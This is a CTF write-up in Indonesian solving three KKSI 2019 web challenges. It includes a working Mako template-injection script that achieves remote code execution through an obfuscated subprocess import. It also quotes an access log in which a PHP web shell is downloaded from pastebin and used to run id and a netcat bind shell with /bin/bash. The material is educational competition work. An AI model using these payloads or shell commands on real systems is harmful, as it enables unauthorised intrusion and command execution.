## Web
### Tsunade Gambling Master
Deskripsi :

> http://202.148.2.243:20001
> You have maximum input on this challenge 3 attempts!

Solusi :
Saat dibuka situsnya, kami mencoba melihat source code dari challenge yang diberikan. Kami mencoba melihat di script Javascript yang diload.

`//It's not flag! Don't Submit it`
 `//I Warn you!`
`var kepla_flag="KKSI2019{",place_flag="Tr0ll1ng_th3_Us3r",penutup="}";function get_point_now(){var t=$("#point").text();return parseInt(t)}function generate_judi_server(t){return Math.round(Math.random()*t)}function genertae_judi_client(){return batas=generate_judi_server(100),Math.round(Math.random()*batas)}function ready_to_serve(){return place_flag.split("_")}function serve(t){var e=t;for($i=0;$i<e.length;$i++)$("#flag"+$i).html("<img src='./fl4g/"+e[$i]+".png'>")}$(document).on("click","#adu",()=>{var t=genertae_judi_client(),e=generate_judi_server(100);$("#client").text(t),$("#server").text(e);var n=get_point_now();t>e?$("#point").text(n+1):$("#point").text(n-1)}),$(document).on("click","#judii",()=>{get_point_now()>=133333333337?(console.log("I know you inspect element it!"),$("#flag").text(place_flag+" Don't Submit it Bratan! It's wrong one!")):$("#flag").text("Go Away. Hus Hus")});`

Setelah dibeautify, kami menemukan sesuatu yang menarik.
```
function ready_to_serve() {
    return place_flag.split("_")
}

function serve(t) {
    var e = t;
    for ($i = 0; $i < e.length; $i++) $("#flag" + $i).html("<img src='./fl4g/" + e[$i] + ".png'>")
}
```
Setelah kami perhatikan, ternyata fungsi diatas tidak dipanggil oleh siapapun. Namun, fungsi `serve()`meminta input dari suatu array. Sementara fungsi `ready_to_serve()` mengeluarkan suatu array yang memecah variabel `place_flag` menjadi array. Lalu, kami mencoba menggabungkan kedua fungsi tersebut dan menjalankan fungsi berikut di console dan flagnya pun keluar.
> `serve(ready_to_serve())`

![](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Tsunade_Gambling_Master/Tsunade%20-%201.png)
Flag : **KKSI2019{JScan_3asY_Troll1nG}**

### Mako Onii-Chan
Deskripsi :

> http://202.148.2.243:21201
> 
>[Main.py](https://drive.google.com/file/d/1HF3SKw4FrNcibCyUrQeaw84QO6XfPuGG/view)

Solusi :
Diberikan suatu file `main.py`, setelah kami analisa ternyata ini adalah file flask, maka kami mencoba melakukan SSTI. Setelah mencoba beberapa jenis SSTI, ditemukan payload yang bisa berjalan yaitu `${1+1}`. 

![](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Mako_Onii-chan/Mako%20-%201.png)

Dengan bentuk payloadnya, kami mengetahui bahwa ini dibangun dengan framework Mako. Setelah mencari-cari jenis payload yang bisa digunakan, kami menyadari bahwa kita bisa melakukan import dengan mengganti parameter import menjadi ascii per karakternya dan di `chr()`.

![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Mako_Onii-chan/Mako%20-%202.png)

Kami mencoba melakukan import subprocess untuk melakukan RCE dan ternyata bisa, dan akhirnya didapatkan flagnya.
```
import base64
import requests as r

exploit = '${__import__(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)).getoutput(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))}'

url = "http://202.148.2.243:21201/intro-gan"
name = exploit.encode('utf-32')
grup = base64.b64encode(name)
data = {'name': grup}
print(r.post(url, data=data).text)
```

![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Mako_Onii-chan/Mako%20-%203.png)

Flag : **KKSI2019{64_32_16_8_4_2_0}**

### Read the Log

Deskripsi :
>[Get Flag Here](http://202.148.2.243:30011/)
>
>[Read the Log](https://drive.google.com/file/d/1zujIwaWX3i9wcmCJX6nYT2o6xtwIWFOM)

Solusi :
Saat membaca `access.log` yang disediakan, kami menemukan sesuatu yang menarik.
>https://pastebin.com/raw/zNg9JQ12 -O .system.php HTTP/1.1" 200 1070166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
>
>172.17.0.2 - - [21/Oct/2019:00:43:40 +0700] "GET /.system.php?f=system&p=id HTTP/1.1" 200 53 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
>
>172.17.0.2 - - [21/Oct/2019:00:45:00 +0700] "GET /.system.php?f=system&p=nc -lvp 1337 -e /bin/bash HTTP/1.1" 504 494 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"

Terlihat ada request ke `.system.php` yang mencurigakan dan memanggil perintah bash seperti nc dan id. Maka kami mencoba mengunjungi halaman tersebut dan ternyata kami bisa melakukan shell_exec disana.

Setelah melakukan ls, kami mengetahui bahwa flagnya ada di `fl4g.txt` (Saat lomba, nama file aslinya adalah `flllllllaaaaaaaaaaaaaaaaaaaaaaaaaaa_g.txt` namun diganti saat penulisan writeup)

Kami melakukan cat dan flagnya pun ditemukan.
![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Read_the_Log/Log%20-%201.png)
Flag : **KKSI2019{Emang_Sabar_Adalah_Kuncinya}** 

